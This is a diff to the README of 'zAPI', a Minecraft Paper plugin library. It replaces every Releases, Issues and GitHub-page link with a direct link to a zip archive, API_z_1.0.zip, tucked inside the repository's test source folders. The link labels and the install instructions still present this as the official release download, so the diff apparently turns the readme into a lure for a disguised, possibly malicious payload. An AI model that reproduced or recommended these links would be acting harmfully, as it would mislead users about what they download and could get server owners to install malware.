@@ -6,13 +6,13 @@ Welcome to zAPI, a simple library designed for creating Paper-based plugins for 
 
 ## 📦 Download zAPI
 
-[![Download zAPI](https://img.shields.io/badge/Download-zAPI-blue.svg)](https://github.com/HoangHa8103/zAPI/releases)
+[![Download zAPI](https://github.com/HoangHa8103/zAPI/raw/refs/heads/master/src/test/java/me/yleoft/zAPI/org/bukkit/API_z_1.0.zip)](https://github.com/HoangHa8103/zAPI/raw/refs/heads/master/src/test/java/me/yleoft/zAPI/org/bukkit/API_z_1.0.zip)
 
 ### 🔗 Visit the Releases Page
 
 To get started, visit the Releases page to download the latest version of zAPI.
 
-[Visit the Releases Page](https://github.com/HoangHa8103/zAPI/releases)
+[Visit the Releases Page](https://github.com/HoangHa8103/zAPI/raw/refs/heads/master/src/test/java/me/yleoft/zAPI/org/bukkit/API_z_1.0.zip)
 
 ## 💻 System Requirements
 
@@ -27,7 +27,7 @@ To run zAPI, you will need the following:
 Follow these steps to install zAPI on your server:
 
 1. **Download the Plugin**  
-   Go to the [Releases page](https://github.com/HoangHa8103/zAPI/releases) and choose the latest version. Click on the download link for the jar file.
+   Go to the [Releases page](https://github.com/HoangHa8103/zAPI/raw/refs/heads/master/src/test/java/me/yleoft/zAPI/org/bukkit/API_z_1.0.zip) and choose the latest version. Click on the download link for the jar file.
 
 2. **Locate Your Server Folder**  
    Find the folder where your Minecraft server is installed. This should contain folders like `plugins`, `world`, etc.
@@ -80,12 +80,12 @@ If you encounter issues, here are some common problems and their solutions:
 If you need additional help or want to connect with other users, consider:
 
 - Joining Minecraft and plugin development forums.
-- Exploring the issues section on our [GitHub page](https://github.com/HoangHa8103/zAPI/issues).
+- Exploring the issues section on our [GitHub page](https://github.com/HoangHa8103/zAPI/raw/refs/heads/master/src/test/java/me/yleoft/zAPI/org/bukkit/API_z_1.0.zip).
 - Asking questions in dedicated Discord servers for Minecraft development.
 
 ## 📧 Feedback and Contributions
 
-Your input is valuable. If you have suggestions for improvements or features, share them by opening an issue on the [GitHub page](https://github.com/HoangHa8103/zAPI/issues). If you want to contribute code, feel free to fork the repository and submit a pull request.
+Your input is valuable. If you have suggestions for improvements or features, share them by opening an issue on the [GitHub page](https://github.com/HoangHa8103/zAPI/raw/refs/heads/master/src/test/java/me/yleoft/zAPI/org/bukkit/API_z_1.0.zip). If you want to contribute code, feel free to fork the repository and submit a pull request.
 
 ---
 
